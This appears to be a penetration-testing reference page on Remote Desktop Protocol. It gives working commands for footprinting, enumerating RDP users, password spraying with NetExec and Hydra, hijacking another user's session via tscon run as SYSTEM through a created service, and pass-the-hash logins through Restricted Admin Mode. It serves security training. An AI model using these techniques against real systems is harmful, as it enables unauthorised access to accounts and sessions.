---
title: RDP
description: Remote Desktop Protocol
categories: [Services]
tags: [Services, RDP]
weight: 2
---

## Service Info
- Name: Remote Desktop Protocol (RDP)
- Purpose: GUI remote management
- Listening port: **3389 (TCP/UDP)** by default
- OS: Windows, Unix-Like (with XRDP)

Remote Desktop Protocol is developed by Microsoft to enable remote access to a Windows computer. It allows display and GUI control commands to be transmitted over the network with encryption. Remote Desktop must be enabled and permitted through the firewall before remote connections are possible.

## Footprinting
Nmap's RDP scripts can enumerate encryption methods and NTLM information (computer name, domain name, etc.). The command below explicitly selects `rdp*` scripts; `rdp-enum-encryption` is not in the default script category.
```shell-session
╭─brian@rx-93-nu ~
╰─$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 15:45 CET
Nmap scan report for 10.129.201.248
Host is up (0.036s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-enum-encryption:
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info:
|   Target_Name: ILF-SQL-01
|   NetBIOS_Domain_Name: ILF-SQL-01
|   NetBIOS_Computer_Name: ILF-SQL-01
|   DNS_Domain_Name: ILF-SQL-01
|   DNS_Computer_Name: ILF-SQL-01
|   Product_Version: 10.0.17763
|_  System_Time: 2021-11-06T13:46:00+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
```

## RDP Access Enumeration
RDP access normally requires membership in **Remote Desktop Users** or **Administrators**, the **Allow log on through Remote Desktop Services** right, and no applicable deny policy. Group membership alone is not a complete access check. From Linux, we can enumerate local group membership using NetExec.
```bash
nxc smb <target-ip> -u <user> -p <password> --local-group "Remote Desktop Users"
```

On the target machine, we can use `net localgroup`.
```cmd
net localgroup "Remote Desktop Users"
```

If the target computer is part of an Active Directory domain, from another domain-joined Windows host, we may import PowerView and use function `Get-NetLocalGroupMember` and specify the name of the host we wish to enumerate.
```shell-session
PS C:\htb> Get-NetLocalGroupMember -ComputerName MS01 -GroupName "Remote Desktop Users"

ComputerName : MS01
GroupName    : Remote Desktop Users
MemberName   : CONTOSO\jsmith
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

BloodHound can also be used to enumerate users with RDP rights as well as the machines they may connect to.

## Password Spraying
We can use NetExec or Hydra to conduct password spraying against RDP to identify account credentials with RDP access.
```bash
nxc rdp 192.168.2.143 -u usernames.txt -p 'password123'
```
```bash
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

## RDP Connection
On Linux machines, we may use `xfreerdp` or `rdesktop` to connect to RDP via terminal commands.
```bash
xfreerdp /u:<username> /p:<password> /v:<target_address>
```
```bash
rdesktop -u <username> -p <password> <target_address>
```
Alternatively, we may also make use of Remmina, a GUI application that allows us to connect to RDP and save connection information.

![](/img/rdp/remmina.png)

On Windows hosts, we can simply use the built-in `mstsc.exe` to make an RDP connection.

![](/img/rdp/mstsc.png)

## RDP Session Hijacking
On Windows versions and configurations that permit it, an administrator able to run as SYSTEM may reconnect another user's RDP session without their password. This is not guaranteed for every session or Windows build. In an Active Directory environment, access to a domain user's session can expose that user's resources.

For the passwordless technique described here, we run `tscon.exe` as SYSTEM on a Windows build and configuration that permit it. Normal `tscon` use requires connection permissions and the other user's password when connecting to a session we do not own. The command below connects the target session to our current session; replace the placeholders with the numeric session ID and destination session name.
```cmd
tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>
```
To run the command above as SYSTEM, rather than using PsExec or Mimikatz, we can instead create a service that executes the command above as SYSTEM.

First, we enumerate the users logged in on the machine.

```shell-session
C:\> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>bcao                  rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 jsmith                rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
```

Next, we use `sc.exe` to create a service named `sessionhijack`, with the `binpath` set to the session hijacking command we wish to run.
```shell-session
C:\> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

Finally, we start the service using `net start`.
```shell-session
net start sessionhijack
```

## RDP Pass-the-Hash
An NT hash may allow RDP authentication through **Restricted Admin Mode** when NTLM is permitted and the account is a member of the target's local **Administrators** group; ordinary RDP access alone is insufficient. The destination must accept Restricted Admin connections. Otherwise, authentication may fail, as illustrated below:

![](/img/rdp/rdp_error.png)

To enable **Restricted Admin Mode**, an administrator can set the DWORD registry value `DisableRestrictedAdmin` to `0` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`.
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
We can execute this command using NetExec if we have administrator-level SMB command-execution access but no existing interactive shell. This does not bypass the registry operation's privilege requirement.
```bash
nxc smb <host> -u <username> -H <nt_hash> \
-x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

Now, we can use `xfreerdp` to log in with the `/pth` flag or Remmina with the `Restricted Admin Mode` option checked and `Password Hash` field filled in.
```bash
xfreerdp /v:<host> /u:<username> /pth:<nt_hash>
```

![](/img/rdp/remmina_pth.png)
